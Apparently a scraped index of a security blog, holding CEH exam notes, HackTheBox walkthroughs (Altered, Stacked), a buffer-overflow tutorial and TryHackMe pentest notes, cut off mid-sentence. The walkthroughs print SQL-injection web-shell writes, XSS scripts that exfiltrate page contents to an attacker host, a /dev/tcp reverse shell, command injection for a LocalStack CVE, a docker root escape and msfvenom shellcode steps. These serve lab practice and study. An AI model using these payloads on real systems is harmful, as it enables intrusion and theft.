command  MAIL FROM – The client must tell the server who the mail is from  RCPT TO – Who the mail is going to  DATA – Ready for the actual message input  QUIT – If no errors, the message would have been sent, close the connection  NOOP –  testing to avoid timeouts  EXPN – verify the existence of one or more mailboxes  StartTLS - use TLS or SSL  VRFY, EXPN used to find valid users, email boxes by hackers.open mail relay:  an SMTP server that is configured to allow anyone on the Internet to send email through itMessage transfer agent: aka mail transfer agent, mail relay. Messages exchanged between mail servers.TPM:  hardware on a motherboard, Trusted Platform Module, generate encryption keys and keep a part of the key inside the TPM rather than all on the disk.DROWN attack:  Decrypting RSA with Obsolete and Weakened eNcryption.  affect all types of servers that offer services encrypted with SSLv3/TLS yet still support SSLv2  cve-2016-0800Padding oracle attack:  “padding oracle” who freely responds to queries about whether a message is correctly padded or not.DUHK attack:  allows attackers to recover secret encryption keys used to secure VPN connections and web browsing sessions.Pharming: misdirecting users to fraudulent websites, by host or DNS. (Phishing: with bad URL)Skimming: capture and steal cardholder’s personal payment information.Pretexting:  social engineering, make story and convince victim to give information.php.ini: in  ‘cgi-bin’ directory, attackers can find: database logins and passwords and verbose error messagesCVSS Score: (4,7,9)  None, 0.0  Low, 0.1 - 3.9  Medium, 4.0 - 6.9  High, 7.0 - 8.9  Critical, 9.0 - 10.0Cryptojacking Attacks:  hijack a target’s devices to stealthily mine cryptocurrency without the user’s awareness.STP attack: The Spanning Tree Protocol(STP), the lowest bridge priority means the root bridge. spoof the root bridge in the topology, force an STP recalculation (redirect to his computer).  victimA—victimB—attacker  -&gt; Va-attacker-Vb.bashrc:  a script file that’s executed when a user logs in.bash_history: stores a history of user commands .profile: run before user login.hping:  hping3 -1 {targetIP} ICMP scan  allows you to create packets effectively from scratch  set specific individual fieldsBluto:  Python-based tool for  DNS recon, DNS zone transfer testing, DNS wild card checks, DNS brute-forcing, e-mail enumeration and more.DNS:  host -t a google.com  nslookup -recursive www_dot_google.com  A Address record  AAAA \tIPv6 address record  CNAME Canonical name record, alias name  NS Name server associated with a domain  SOA Start of [a zone of] authority record  AXFR Authoritative Zone Transfer  MX mail exchange.SOA: Service-oriented architecture.  can be accessed remotelyIPv6 (and IPSec) allows for header authentication, IPv4 does not.split-horizon DNS: aka  split-view DNS, split-brain DNS, or split DNS.  first DNS server on the internal network and second DNS in DMZDNSSEC:  cache poisoning prevention tool.  provide to DNS clients (resolvers) origin authentication, authenticated denial of existence and data integrity  but not availability or confidentialityDynDNS: Dynamic DNS, automatically updating a name serverEDNS: Extension Mechanisms for DNS,  expanding the size of several parameters of DNS.AndroidManifest.xml: basic configuration in an Android applicationDroidSheep: Android application, allow intercept unprotected web-browser sessions using WiFi.Agent Smith attack: a modular malware that exploits Android vulnerabilities to replace legitimate existing apps with a malicious imitation.Androrat: Android and RAT.DroidDream: malware, Trojan, gain root access to AndroidOrbot: Tor on AndroidDES: Data Encryption Standard (DES). fixed block size of 64 bits, and a key size of 56 bitsMeet-in-the-middle attack:  space–time tradeoff cryptographic attack  the primary reason why Double DES is not used  why a Triple DES key (168-bit = 56*3) can be bruteforced by an attacker with 256 space and 2112 operations.Triple DES:  64-bit block size that is encrypted three times with 56-bit keys  E_k3(D_k2(E_k1(plain text))), encrypt with K1, then decrypt with K2, finally encrypt with K3.IDEA: International Data Encryption Algorithm, a symmetric-key block cipher, used in PGP v2.0  64-bit blocks using a 128-bit key and consists of a series of 8 identical transformationsRSA: uses 1,024- and 2,048-bit key strengths as asymmetric encryption algorithmsDSA: Digital Signature Algorithm. compares two hash values in order to provide non-repudiation.AES: The Advanced Encryption Standard (AES).  fixed block size of 128 bits  key size: 128, 192, or 256 bits. symmetric.  selected by NIST as the principal method for providing confidentiality after the DES algorithm  5 finalist: MARS, RC6, Rijdael, Serpent, Twofish.  Rijdael: algorithm finally selected as AES.Encryption Mode: Electronic Codebook(ECB), Cipher-Block Chaining (CBC), Cipher Feedback (CFB), Output Feedback(OFB)  ECB no IV, cypher with same pattern if plaintext same.  CBC with IV.  CFB stream encryption. plain text XOR with encrypted IV, so can encrypt bit by bit. feed cypher to next block.  feed encrypt IV (cypher before XOR) to next block.HMAC: Hash-based thentication,  verify both the integrity and authenticity of a messageTwofish: a symmetric key block cipher, block size of 128 bits, keys up to 256 bits.Blowfish: a symmetric-key block cipherSHA-1: 20-byte/ 40-hex / 160-bit, algorithm same to MD2, MD4, MD5SHA-256:MD5: 128-bit hash valueRC5: symmetric-key block cipher.  The Advanced Encryption Standard (AES) candidate RC6 was based on RC5.Serpent: symmetric key block cipher,  block size of 128 bits,  finalist in the Advanced Encryption Standard (AES)CAST-128: 64-bit block size,  key size between 40 and 128 bits,RC-4:  stream cipherPGP, SSL, IKE:  public-key cryptographyPGP: Pretty Good Privacy, Phil Zimmerman create.A web of trust: a concept used in PGP, GnuPG, and other OpenPGP-compatible systems to establish the authenticity of the binding between a public key and its owner.GPG: GNU Privacy Guard, free version of PGP ,encrypt and sign your data and communications, hybrid-encryptionPKI:  certification authority (CA)  issues digital certificatesCR (Certification Request):  the process of obtaining a certificate.VA (Validation authority): verify the validity of a digital certificate.KDC (key distribution center):  reduce the risks inherent in exchanging keys.Cryptcat: communicate between two systems and encrypts with twofishWEB-STAT: an app, analyzing web traffic, find users` location, search engine, last visit, equipment, and more.Webroot: an American privately-held cybersecurity software companyWebSite-Watcher: a closed source shareware program, monitor changes to web pages.WAFW00F:  Python tool, fingerprint and identify Web Application Firewall (WAF) products, active reconnaissance toolping: -n count on Windows, -c count on Linux.three-tier application:  presentation tier, aka user interface. HTML, CSS, and JavaScript.  application tier, aka logic tier. Python, Java, Perl, PHP or Ruby.  data tier. PostgreSQL, MySQL, MariaDB, Oracle, DB2, Informix or Microsoft SQL Server; or Cassandra, CouchDB, or MongoDBtier vs layer: tier on different infrasturctures.windows TTL: 128linux TTL: 64five-tier container technology architecture:  Tier-1: Developer machines  Tier-2: Testing and accreditation systems  Tier-3: Registries  Tier-4: Orchestrators  Tier-5: HostsThe Docker daemon:  listens for Docker API requests and manages Docker objects such as images, containers, networks, and volumes.The Docker client: Docker users interact with Docker.A Docker registry: stores Docker images.Docker objects: images, containers, networks, volumes, pluginsVulnerability Management Life Cycle:  Discover  Prioritize Assets  Assess  Report  Remediate  VerifyiOS Trustjacking:  attackers to exploit the iTunes Wi-Fi sync featureTrident: a vulnerability, allow espionage of IOS on smartphone.DNS Tunneling: encodes the data of other programs or protocols in DNS queries and responses, to bypass firewall.MIB: Management Information Base  LMMIB2.MIB         workstation and server services  DHCP.MIB             network traffic between remote hosts and DHCP servers  HOSTMIB.MIB       host resources  MIB_II.MIB           managing TCP/IP-based internets  WINS.MIB             Windows Internet Name Service (WINS)Doxing: malicious identification and online publication of information about an individual.Daisy-chaining: same information to gain access to multiple networks and computers.Shellshock:  () {:;}; /bin/cat /etc/passwd  attackers send a malformed environment variable  aka. Bash Bug  not on Windows.bastion host: aka jump box ,a server used to manage access to an internal or private network from an external networkWAF: Web Application Firewall, layer 7 defence.NAC: Network Access ControlMeltdown &amp; Spectre exploit: critical vulnerabilities in modern processorsNamed Pipe Impersonation: named pipes are used to provide legitimate communication between running processes.Application Shimming: transparently intercepts API calls and changes the arguments passed, may allow malicious acts.Launch Daemon: Adversaries install a new launch daemon execute at startup.Single sign-on (SSO):  login once and access services without re-entering authentication factors  disadvantage: a single point of failure for authentication.SESAME: used for single sign-on.ISAPI: recommend disable unnecessary ISAPI filters, to defend against webserver attacks.Sinkhole Attack: compromised node tries to attract network traffic by advertising its fake routing update.Corporate espionage:  Wiretapping a competitor  blackmail, bribery, and technological surveillance to the target company.blackberry:  Blackjacking:  hijacking a BlackBerry connection  BBProxy: allows attacker to use a BlackBerry device as a proxy  BBScan:  BlackBerry port scannerCHNTPW:  linux-based tool,  change user password, en/disable accounts,  on Windows NT, 2000, XP, Vista, 7, 8, 8.1 and 10.  by editing SAM database.windows password:  in Security Account Manager (SAM) file at:  C:\\Windows\\system32\\configSAM security identifier:            administrator account (like 0 for root in linux)      SAM log file on Registry locate: HKEY_LOCAL_MACHINE\\SAMPDU on layers:  bit (physical)  frame (datalink)  packet (network)  segment(TCP) or datagram(UDP) (transport)  data(layer5-layer7) (application)TCP/IP vs OSI:  Network Interface vs Physical, Data link  Internet vs Network  Transport vs Transport  Application vs Session, Presentation, ApplicationRules of engagement (ROE): describes the specifics of the testing, the associated violations and essentially protects both the organization’s interest and third-party penetration tester  The type and scope of testing  Client contact details  Client IT team notifications  Sensitive data handling  Status meeting and reportsSDLC: Software Development Life Cyclesecurity testing:  Automated Tools: Coverage, Efficiency, Qualifications, Reporting, Investment  Manual Approach: Effectiveness, Validity, Accuracy, Custom Reporting, Investment3-2-1 backup rule: keep at least three separate versions of data on, two different storage types with at least, one offsite.Cryptanalysis:  Global deduction.                 discovers a functionally equivalent algorithm for encryption and decryption, but without learning the key.  Instance (local) deduction.   discovers additional plaintexts (or ciphertexts) not previously known.  Information deduction.         gains some Shannon information about plaintexts (or ciphertexts) not previously known.  Total break.                         deduces the secret keyNo ABAC validation: No proper attribute-based access control,  allows attackers to gain unauthorized access to APIheap spray: put malicious code in different heap(non-executable part) locations, give more chance to hit and execute.  may not allow for remote code execution.vendor lock-in problem: customers of a cloud service provider (CSP) cannot easily move to a different vendor without substantial costs or technical incompatibilities            Data transfer risk                  Application transfer risk                  Infrastructure transfer risk                  Human resource knowledge risk      types-of-threat-intelligence:  Strategic Threat Intelligence.          long-term, high level.            high level information on changing risks.  Tactical Threat Intelligence.            long-term, low level              information on attackers` TTPs.  Operational Threat Intelligence.      short-term, high level            information on specific incoming attack.  Technical Threat Intelligence.          short-term, low level             Specific IOC(Indicator of compromise )Key escrow:  key is held in escrow by a third party  hold certificates and keys in case the primary keys or certificates are unavailableKey whitening:  It consists of steps that combine the data with portions of the key.Key schedule: an algorithm that calculates all the round keys from the keyKey encapsulation: secure symmetric cryptographic key material for transmission using asymmetric (public-key) algorithms.Server Side Includes Injection: Another way to discover if the application is vulnerable is to verify the presence of pages with extension .stm, .shtm and .shtml.Smudge attack: oily smudges produced and left behind by the user’s fingers to find the pattern or codePassword spraying attack:  logins based on list of usernames with one default passwords on the application.unuseful knowledge:  Syhunt Hybrid:  static and dynamic security scans to detect vulnerabilities like XSS, File Inclusion, SQL Injection, Command Execution.  AT&amp;T USM Anywhere: centralizes security monitoring of networks and devices in the cloud, on-premises,  in remote locations  Saleae Logic Analyzer:  record and display signals in your circuit to debug it fast.  Cisco ASA:  hardware firewalls developed by Cisco SystemsCisco SPAN port: on a Cisco switch, Switched Port Analyzer. gather trafficCredential enumerator:  a self-extracting RAR file (containing bypass and service components),  to retrieve information related to network resources such as writable share drivesNetPass.exe:  recovers all network passwords stored on a system for the current logged-on userOutlook scraper: scrapes names and email addresses from the victim’s Outlook accounts, for future phishing.Mail PassView: a password recovery tool that reveals passwords and account details for various email clients such as Microsoft Outlook, Windows Mail, Mozilla Thunderbird, Hotmail, Yahoo! Mail, and Gmail and passes them to the credential enumerator module.incident handling and response process:            Preparation                  Incident recording and assignment                  Incident triage                  Eradication      incident handling process phases:            Preparation                  Identification                  Containment                  Neutralization                  Recovery                  Review      Zero Trust Network Access (ZTNA): providing only the access to services the user has been explicitly grantedwget 192.168.0.10 -q -S  -q will suppress the normal output  -S parameter will print the headers sent by the HTTP or FTP server  banner grabbingKubernetes:  Kube-scheduler. master component, scans newly generated pods and allocates a node for them  Kube-apiserver. front-end utility  Kube-controller-manager.  master component, runs controllers  cloud-controller-manager. master component, run controllers that communicate with cloud providers.Key stretching: make weak key more secure, against brute-force.Key derivation function (KDF): derives one or more secret keys from a secret valueRIR:  RIPE NCC  APNIC  AFRINIC  LACNIC  ARINARIN LOOKUP:  American Registry for Internet Numbers, https://mxtoolbox.com/arin.aspx  retrieve information like: organization’s network range, network topology and operating system used.SCADA: Supervisory control and data acquisition. industrialpassword-cracking: hashcat, john the ripper, ophcrackOphcrack: use rainbow table, crack Windows log-in passwordsCeWL: ruby app, spider find url to build wordlistHootsuite: gather information from social mediaOSINT framework:  https://osintframework.com/  contains a set of the most popular tools that facilitate your tasks of collecting information and data from open sourcesSpearphone attack: breaches speech privacywash: kali tool, identifying WPS enabled access pointssqlmap:  –dbs Enumerate DBMS databasesCredential stuffing attack:  attacker uses known username/password combinationsping to death: first in 1996.kerberos: allow workstations to authenticate against remote servicesKerberoasting:  send requests using Kerberos with the intent of gathering information about accounts that could be used offline.  look like legitimate trafficnet view /domain:&lt;domain_name&gt;  show all the systems within the domain/var/log/lastlog: the activities of the last user that signed inCPU instruction:  0x90 NOP  0x99 ADD  0x91 COPYUDP datagram payload: 65,535 - 8(header) - 20(IP header) = 65507(payload size)  shared responsibility model: determines who has responsibility for what aspects of a service with a cloud services provider.  Bell-LaPadula: data classification and management  Carnegie Mellon Maturity Model: aka Capability Maturity Model. assess maturity, especially within software development organizations.IANA: Internet Assigned Numbers Authority  administrative control: aka soft control. like Security policy.  technical control: like access control list.  physical control: mantrap, biometric deviceMegaPing: Windows GUI tool, do ping sweeps and port scansEternalBlue: takes advantage of a vulnerability in the Server Message Block protocolClean desk policy: clean off their desk, empty trash, shred sensitive documents  local area network: rooms  metropolitan area network: buildings, city blocks  wide area network: countries, statesRFC 1918: non-routable IP addresses. 10.0.0.0–10.255.255.255, 172.16.0.0–172.31.255.255, and 192.168.0.0–192.168.255.255Defensible network architecture: includes the ability to isolate systems and detect attacks and may also include preventive measuresEDGAR:  Electronic Data Gathering, Analysis, and Retrieval,  financial information about a company, including financial reportsThe crossover error rate (CER)  is the point at which the FRR(false reject rate) and the FAR(false acceptance rate) intersect.  meaning set at an optimal setting for authenticating subjectwindows hide file: attrib +h   disassembly: opcodes to assembly language, lower level  Decompilation: compiled program to source code, higher levelBuffers provide static data storage capacity, while Dynamic data storage is kept on the heappackETH: craft packets with data in both the headers and payload.ISO 27001: Plan, Do, Check, Act.RMI: java Remote Method Invocation, passes objects between systems.Clark-Wilson model: use unconstrained data items (UDIs), constrained data items (CDIs), when about integrety.false failure rate: aka false reject rate.arpspoof: tool can be used to spoof a MAC addresslast123software firewallteardropDNSSECNTP portIPSEC layer802.11aObfuscation attackNIDShttps://wiki.danielgorbe.com/books/ceh-v10"
  },
  
  {
    "title": "htb altered",
    "url": "/posts/htb-altered/",
    "categories": "sec",
    "tags": "htb",
    "date": "2022-04-02 11:33:00 +0800",
    





    "snippet": "Know it`s an php lavarel application behind nginx.Brute force Laravel application pintry type juggling  change content type to application/json  application/x-www-form-urlencoded, body is name=admin&amp;pin=1234  application/json, body is {\"name\":\"admin\", \"pin\":true} try type juggling, php == not === vulnarability, but no on this box.fuzz  In type Juggling, we know the php uses ===  wfuzz -H 'Cookie:{content}' -H 'Content-Type:application/x-www-form-urlencoded' -u {URL/api/resettoken} -d 'name=admin&amp;pin=FUZZ' -z range,1000-9999  response “too many requests”  need to bypass rate limit.bypass rate limitsearch website like https://book.hacktricks.xyz/pentesting-web/rate-limit-bypassfind a way: add X-Forwarded-For: {IP} in the header.wfuzz with two fuzz positions.wfuzz -e iterators# Available iterators:#   Name    | Summary                                                                           # ----------------------------------------------------------------------------------------------#   chain   | Returns an iterator returns elements from the first iterable until it is exhaust  #           | ed, then proceeds to the next iterable, until all of the iterables are exhausted  #           | .                                                                                 #   product | Returns an iterator cartesian product of input iterables.                         #   zip     | Returns an iterator that aggregates elements from each of the iterables.  type juggling and SQL injectionread database{  \"id\":\"100 union select 1,2,group_concat(concat('\\n', table_name, ':', column_name)) from information_schema.columns where table_schema='uhc' -- -\",  \"sceret\":true}read file{  \"id\":\"100 union select 1,2,LOAD_FILE('/etc/nginx/sites-enabled/default')-- -\",  \"sceret\":true}find out website`s root file, at /srv/altered/publicwrite web shell to website{  \"id\":\"100 union select 1,2,'&lt;?php system($_REQUEST[\\\"cmd\\\"]);  ?&gt;' into outfile '/srv/altered/public/shell.php'-- -\",  \"sceret\":true}got an error, but file still wrote to server.Then make a reverse shell by it. Make sure not hang the server after the reverse shell.privescuname -afind the kernel was build on 2022/01/10Dirty Pipe.  come out later than the kernel.  https://dirtypipe.cm4all.com/  overwrite data to file, like passwd."
  },
  
  {
    "title": "htb stacked",
    "url": "/posts/htb-stacked/",
    "categories": "sec",
    "tags": "htb, aws, localstack",
    "date": "2022-03-29 11:33:00 +0800",
    





    "snippet": "reconnmapnmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.11.112nmap -p 22,80,2376 -sCV -oA scans/nmap-tcpscripts 10.10.11.112  22/tcp   open  ssh; 80/tcp   open  http; 2376/tcp open  dockerferoxbuster, directory discoveryferoxbuster -u http://stacked.htbwfuzz, host discoverywfuzz -H \"Host: FUZZ.stacked.htb\" -u http://stacked.htb -w /usr/seclists/Discovery/DNS/subdomains-top1million-20000.txt --hw 26  hide word length 26 responses  find host: portfolio.stacked.htb - TCP 80  a local stack development page.  https://github.com/localstack/localstack  serverless: run services often used for Serverless apps (iam, lambda, dynamodb, apigateway, s3, sns)XSSrecon for XSS  input area, and interesting headers.  add payload as &lt;img src=\"http://{attackerIP}/fieldname_or_header_name\"&gt; in different places.  send the request.attacker machinesudo python3 -m http.server 80  80 as we did not specify port in set payload  wait a while  \"GET /referer HTTP/1.1\" 404 -  so the ONLY field vulnerable to XSS is: Header -&gt; referer.            run date two times, culculate the XSS victim(background cron) activity interval.        interesting material below.  https://www.horizon3.ai/unauthenticated-xss-to-remote-code-execution-chain-in-mautic-3-2-4/find out what the URL the victim is looking at.  Burpsuite set header Referer:   python3 -m http.server 80 at pwn.js location, for victime to run pwn.js.  use nc to accept the victim`s response.xmlhttprequest:  like background web request by browser.    XMLHttpRequest.open(method, url, async)// if async = false, the script itself will not go foward, until the response. Otherwise, we will get null.XMLHttpRequest.send(body)// body: Optional, A body of data to be sent in the XHR request.      Method 1:(lucky there is a referer header)&lt;script src=\"http://10.10.14.6/xss.js\"&gt;&lt;/script&gt;   in the victim`s referer, we can see the response is from: “/read-mail.php?id=5”Method 2: (more generic)var exfilreq = new XMLHttpRequest();    exfilreq.open(\"GET\", \"http://{attackerIP}/\" + document.location, false);    exfilreq.send();   set above script as pwn.js  when we nc at 80, can see the victim`s current page appended.  in nc, we get “GET /http://mail.stacked.htb/read-mail.php?id=2 HTTP/1.1”  For victim visited “http://{attackerIP}/http://mail.stacked.htb/read-mail.php?id=2”This step we find out the inner email host name. (mail.stacked.htb)Let victim visit inner pages for us.// Make target to visit the targetvar target = \"{the address we want victim to visit}\"var req1 = new XMLHttpRequest();req1.open('GET', target, false);req1.send()var response=req1.responseText;// Send what victim saw back to usvar req2 = new XMLHttpRequest();req2.open('POST', \"http://{attackerIP}:8000/\", false)req2.send(response);  set target to “http://mail.stacked.htb/read-mail.php?id=1”  read the mail.  find new host “s3-testing.stacked.htb”  a s3 domain.LocalStack vulnerabilityFind CVE-2021-32090  locatstack version v0.12.6  CVE search  CVE-2021-32090  The dashboard component of StackLift LocalStack 0.12.6 allows attackers to inject arbitrary shell commands via the functionName parameter.configure awsapt install awscliaws configure aws [command] [subcommand] --endpoint-url http://s3-testing.stacked.htb  as the config said “SERVICES=serverless”aws lambda list-functions --endpoint-url http://s3-testing.stacked.htbCreate lambda(this box only has nodejs runtime)  https://aws.amazon.com/lambda/  https://docs.aws.amazon.com/cli/latest/reference/lambda/create-function.htmlcreate random lambda function//example from official websiteexports.handler = async function(event, context){  console.log(\"Event: \\n\" + JSON.stringify(event, null ,2))  return context.logStreamName}zip index.jszip index.zip index.jscreate this function at endpointaws lambda create-function \\    --function-name 'a' \\    --zip-file fileb://index.zip \\    --handler index.handler \\    --role localstackdonotmatter\\    --runtime nodejs10.xinvoke the functionaws lambda --endpoint=http://s3-testing.stacked.htb \\  invoke --function-name a outputcheck if it run properlycat outputPS:  if use python script, set “Runtime”: “python3.7”, but this machine does not have python runtime, so there would be an error.  A Lambda function can be thought of as spinning up a relatively empty container, running the function, and then tearing that container down. So it`s not properate to make a reverse shell by lambda.Exploit CVE-2021-32090The idea here is that there is a command injection in the “function name”, will be triggered when it’s displayed on the web dashboard.  In previous config file, we know that dashboard is at port 8080 on victim`s machine.  ref: https://blog.sonarsource.com/hack-the-stack-with-localstackhow:            send user to dashboard by XSS.        In referer header add: &lt;script&gt;document.location=\"http://127.0.0.1:8080\"&lt;/script&gt;            command inection in “function name”.        Test simple wget command first.reverse shellexecute shellecho -n 'bash -i &gt;&amp; /dev/tcp/{attackerIP}/{port} 0&gt;&amp;1' | base64 -w 0  add some space to avoid ‘+’ or ‘=’ sign, maybe bad character.(maybe not needed)invoke the command--function-name 'echo -n {base64 reverseshell} | base64 -d | bash'upgrade shellpython3 -c 'import pty; pty.spawn(\"/bin/bash\")'^Zstty raw -echo; fgmake the shell can clear screenexport TERM=xtermNow in the localstack container.privescPSPY  pspy - unprivileged Linux process snooping  https://github.com/DominicBreuker/pspy  download to victim, can not run at /dev/shm (noexec), but can run at /tmp  find that handler was run by root.  so add handler the reverse shell.    aws lambda create-function \\  --function-name '{not this time}' \\  --zip-file fileb://index.zip \\  --handler '$({the reverse shell command as before})' \\  --role localstackdonotmatter\\  --runtime nodejs10.x        get root of the container.  On gtfobins.io    # Shell# It can be used to break out from restricted environments by spawning an interactive system shell.# The resulting is a root shell.docker run -v /:/mnt --rm -it alpine chroot /mnt sh        then get the system root.  "
  },
  
  {
    "title": "Buffer over flow",
    "url": "/posts/BOF/",
    "categories": "sec",
    "tags": "bof, assembly, thm",
    "date": "2022-03-27 11:33:00 +0800",
    





    "snippet": "Learn from Videounderstand stack MOST IMPORTANT !!!What happens when you call a procedure?  https://www.youtube.com/watch?v=RU5vUIl1vRsAssembly Programming Assembly Function Stack Frame Explained  https://www.youtube.com/watch?v=vcfQVwtoyHY{low}ESP points to the top of the stack, at lower memory location.{buffer}EBP points to higher memory address, at the bottom of the stack, EIP holds the address of next instruction to be executed.{high}(one function on stack)lower addressat ESP value (Extended Stack Pointer)this Buffer Spaceat EBP value (Extended Base Pointer)at EIP value (Extended Instruction Pointer) / Return Addressshellcode start pointhigher addressThe process:  ESP hit command to get input, and the input change the stack value. EBP right, know next is EIP, EIP right. Value in stack wrong.  when ESP hit where EBP saves(on stack), the EBP value will change(or not). EBP wrong, EIP right.  when ESP hit where EIP saves(on stack), the EIP value will change.(to an address with value “JMP ESP”)  then ESP value increase. (so its meaningfull when we jump back, to the payloads.)  EIP do JMP ESP (JMP back to where the ESP is now pointing.)  EIP do the payload commands line by line.(one program in memory)(EIP start from TEXT, when meet a function, point to STACK return address))lower addressTEXTDATAHEAPSTACKhigher addressRET instruction:  This will take a dword from the top of the stack at esp and load it to eip,  while also adding 4 to esp’s value (to move it up to the next entry)Another way(not JMP ESP):  PUSH ESP, RET  https://www.rcesecurity.com/2011/12/buffer-overflow-exploitation-jump-to-shellcode-via-push-espret/Cyber Mentor BOF video and his recommendation  https://www.youtube.com/watch?v=ncBblM920jw  https://github.com/johnjhacking/Buffer-Overflow-Guide  https://tcm-sec.com/buffer-overflows-made-easy/Practice by vulnserver and Immunity Debuggervulnserver  https://thegreycorner.com/vulnserver.htmlif Windows block the download, turn off Windows Defender.Immunity Debugger  https://www.immunityinc.com/products/debugger/Cyber Mentor BOF process:  Spiking  Fuzzing  Finding the Offset  Overwriting the EIP  Finding Bad Characters  Finding the Right Module  Generating Shellcode  Rootnc -nv 192.168.1.90 9999connect to vuln servercommand, STATS [stat_value]1. Spikinggeneric_send_tcpapt-get install spike  ./generic_send_tcp host port spike_script SKIPVAR SKIPSTR  ./generic_send_tcp 192.168.1.100 701 something.spk 0 02. FuzzingSend different characters try to break the program to find the offset/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 3000 -q 386F43373. Finding the Offsetfind EIP at 20034. Overwriting the EIP  EIP is 4 bytes. (32-bits)  Shellcode = “A” * 2003 + “B” * 4  check if B start at EIP.  HEX 41: A.   HEX 42: B.  EIP = “42424242” will be successful.5. Finding Bad Characters  google: “badchars”  !mona bytearray -cpb “\\x00”6. Finding the Right ModuleFind DLL without memory protection.  search mona.py, save to /Immunity Debugger/ PyCommands.Get JMP ESP shell code# locate nasm_shell# /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb──(root💀kali)-[/home/kali]└─# /usr/share/metasploit-framework/tools/exploit/nasm_shell.rbCalling `DidYouMean::SPELL_CHECKERS.merge!(error_name =&gt; spell_checker)' has been deprecated. Please call `DidYouMean.correct_error(error_name, spell_checker)' instead.nasm &gt; JMP ESP00000000  FFE4              jmp espin mona, search JMP ESP location!mona modules!mona find -s \\xff\\xe4\" -m essfunc.dllanotherway: !mona jmp -r ESP -m “essfunc.dll”this module has no memory protections7. Generating Shellcodemsfvenom -p windows/shell_reverse_tcp LHOST={IP} LPORT={Port} EXITFUNC=thread -f c -a x86 -b “\\00”in python3:put ‘b’ before shell code, means byte encode.THM Brain storm boxnmap -T4 -p- -Pn 10.10.131.179get: 21, 3389, 9999~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ftp 10.10.131.179name: anonymousftp&gt; lschatserver.exeessfun.dllftp&gt; prompt OFFftp&gt; binaryfor safe transfer, byte may crashftp&gt; mget *ftp&gt; bye~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~in Windowsdefender offfirewall off\\r = CR (Carriage Return) → Used as a new line character in Mac OS before X\\n = LF (Line Feed) → Used as a new line character in Unix/Mac OS X\\r\\n = CR + LF → Used as a new line character in Windows"
  },
  
  {
    "title": "Jr Penetrarion Test",
    "url": "/posts/Jr-Penetration-Tester/",
    "categories": "sec",
    "tags": "recon, idor, file-inclusion, ssrf, xss, injection, burpsuite, nmap, protocal, metasploit, msfvenom, meterpreter, reverse-shell, privesc",
    "date": "2022-01-28 00:00:00 +0800",
    





    "snippet": "Content Discovery  Wappalyzer (https://www.wappalyzer.com/)  The Wayback Machine (https://archive.org/web/)  Automated Discovery https://github.com/danielmiessler/SecLists  ffuf,  “Fuzz Faster you Fool”  user@machine$ ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://MACHINE_IP/FUZZ  dirb  user@machine$ dirb http://MACHINE_IP/ /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt  gobuster  user@machine$ gobuster dir --url http://MACHINE_IP/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txtSubdomain Enumeration  Certificate Transparency (CT) logs          SSL/TLS Certificates. (https://crt.sh ; https://transparencyreport.google.com/https/certificates)        google search -site:www.tryhackme.com  site:*.tryhackme.com  dnsrecon -t brt -d acmeitsupport.thm  ./sublist3r.py -d acmeitsupport.thm  private DNS server. “/etc/hosts” file (or c:\\windows\\system32\\drivers\\etc\\hosts file for Windows users)  ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H \"Host: FUZZ.acmeitsupport.thm\" -u http://10.10.123.130  ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H \"Host: FUZZ.acmeitsupport.thm\" -u http://10.10.123.130 -fs {size} -fs switch, which tells ffuf to ignore any results that are of the specified size.Authentication Bypassfuzz posibble exist usernames.  https://github.com/ffuf/ffuf  ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d \"username=FUZZ&amp;email=x&amp;password=x&amp;cpassword=x\" -H \"Content-Type: application/x-www-form-urlencoded\" -u http://10.10.94.177/customers/signup -mr \"username already exists\"  -X argument specifies the request method.  -d argument specifies the data that we are going to send.  -H argument is used for adding additional headers to the request. setting the “Content-Type” to the webserver knows we are sending form data.  -u argument specifies the URL we are making the request to.  -mr argument is the text on the page we are looking for to validate we’ve found a valid username.brute force  ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d \"username=W1&amp;password=W2\" -H \"Content-Type: application/x-www-form-urlencoded\" -u http://10.10.2.151/customers/login -fc 200  -fc argument to check for an HTTP status code other than 200.logic flaw  curl 'http://10.10.2.151/customers/reset?email=robert@acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&amp;email={username}@customer.acmeitsupport.thm'  the server send email to the address client postscookie tempering  curl -H \"Cookie: logged_in=true; admin=true\" http://10.10.2.151/cookie-test  Hash crack website. https://crackstation.net/IDOR  Insecure Direct Object Referencefind IDOR in Encode IDs  https://www.base64decode.org/; https://www.base64encode.org/find IDOR in Hashed IDs  https://crackstation.net/File Inclusioncommon OS files:  /etc/issue, /etc/profile, /proc/version, /etc/passwd,  /etc/shadow, /root/.bash_history, /var/log/dmessage,  /var/mail/root, /root/.ssh/id_rsa, /var/log/apache2/access.log  C:\\boot.iniPhp include function:  https://www.php.net/manual/en/function.include.phpfile-get-contents.php:  https://www.php.net/manual/en/function.file-get-contents.php  user’s input is passed to a function such as file_get_contents in PHP.  It’s important to note that the function is not the main contributor to the vulnerability. Often poor input validation or filtering is the cause of the vulnerability.    file_get_contents( string $filename, bool $use_include_path = false, resource $context = ?, int $offset = 0, int $length = ?): string|false      Local File Inclusion (LFI)&lt;?PHP \tinclude(\"languages/\". $_GET['lang']); ?&gt;Warning: include(languages/../../../../../etc/passwd.php): failed to open stream: No such file or directory in /var/www/html/THM-4/index.php on line 12. Auto add “.php”.  Conquer: include(\"languages/../../../../../etc/passwd%00\").\".php\"); %00 or 0x00  NOTE: the %00 trick is fixed and not working with PHP 5.3.4 and above.Remote File Inclusion - RFI  One requirement for RFI is that the allow_url_fopen option needs to be on.  allow_url_include  https://www.php.net/manual/en/filesystem.configuration.php#ini.allow-url-fopen  lead server to execute code from attacker`s server.  start attack server: sudo python3 -m http.server  prepare payload: cmd.txt: &lt;?php print exec('hostname');?&gt;  lead victim server to execute it: 